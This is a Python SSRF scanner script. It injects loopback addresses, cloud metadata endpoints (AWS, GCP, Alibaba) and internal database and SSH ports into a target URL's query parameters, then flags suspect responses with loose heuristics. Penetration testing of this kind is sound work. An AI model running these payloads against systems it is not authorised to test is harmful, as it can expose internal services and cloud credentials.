#!/usr/bin/env python3
"""SSRF Scanner — detects server-side request forgery vulnerabilities."""
import argparse
import re
import sys
import time
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

import requests

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "*/*",
}

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254",  # AWS metadata
    "http://metadata.google.internal",  # GCP metadata
    "http://100.100.100.200",  # Alibaba Cloud metadata
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:6379",
    "http://127.0.0.1:27017",
    "http://[::1]",
]


def extract_params(url: str) -> dict:
    parsed = urlparse(url)
    return parse_qs(parsed.query)


def test_ssrf(url: str, param: str, payload: str) -> dict:
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    test_url = parsed._replace(query=new_query).geturl()
    try:
        resp = requests.get(test_url, headers=HEADERS, timeout=15, allow_redirects=True)
        indicators = [
            "SSRF" in resp.text,
            "localhost" in resp.text and payload == "http://127.0.0.1",
            "amazon" in resp.text.lower() or "ami-id" in resp.text.lower(),
            resp.status_code == 200 and len(resp.text) < 5000,
        ]
        return {
            "url": test_url,
            "param": param,
            "payload": payload,
            "status": resp.status_code,
            "length": len(resp.text),
            "potential_ssrf": any(indicators),
        }
    except Exception as e:
        return {"url": test_url, "error": str(e)}


def scan_target(url: str, max_params: int = 10) -> list[dict]:
    params = extract_params(url)
    if not params:
        print(f"[!] No query parameters found in {url}")
        return []
    param_names = list(params.keys())[:max_params]
    print(f"[*] Scanning SSRF on {url}")
    print(f"[*] Parameters: {', '.join(param_names)}")
    results = []
    for param in param_names:
        for payload in SSRF_PAYLOADS:
            result = test_ssrf(url, param, payload)
            results.append(result)
            if result.get("potential_ssrf"):
                print(f"[POTENTIAL SSRF] {param} -> {payload}")
            time.sleep(0.2)
    return results


def main():
    parser = argparse.ArgumentParser(description="SSRF Scanner")
    parser.add_argument("url", help="Target URL with query parameters")
    parser.add_argument("--max-params", type=int, default=10)
    parser.add_argument("--output", default="reports/ssrf_scan.jsonl")
    args = parser.parse_args()
    results = scan_target(args.url, args.max_params)
    hits = [r for r in results if r.get("potential_ssrf")]
    print(f"\n[*] Scan complete. {len(hits)} potential SSRF issues out of {len(results)} tests.")
    if hits:
        print("[!] Review hits manually before reporting!")
    from pathlib import Path
    out = Path(args.output)
    out.parent.mkdir(parents=True, exist_ok=True)
    with open(out, "a", encoding="utf-8") as f:
        for r in results:
            f.write(__import__("json").dumps(r, ensure_ascii=False) + "\n")
    print(f"[*] Results saved to {out}")


if __name__ == "__main__":
    main()
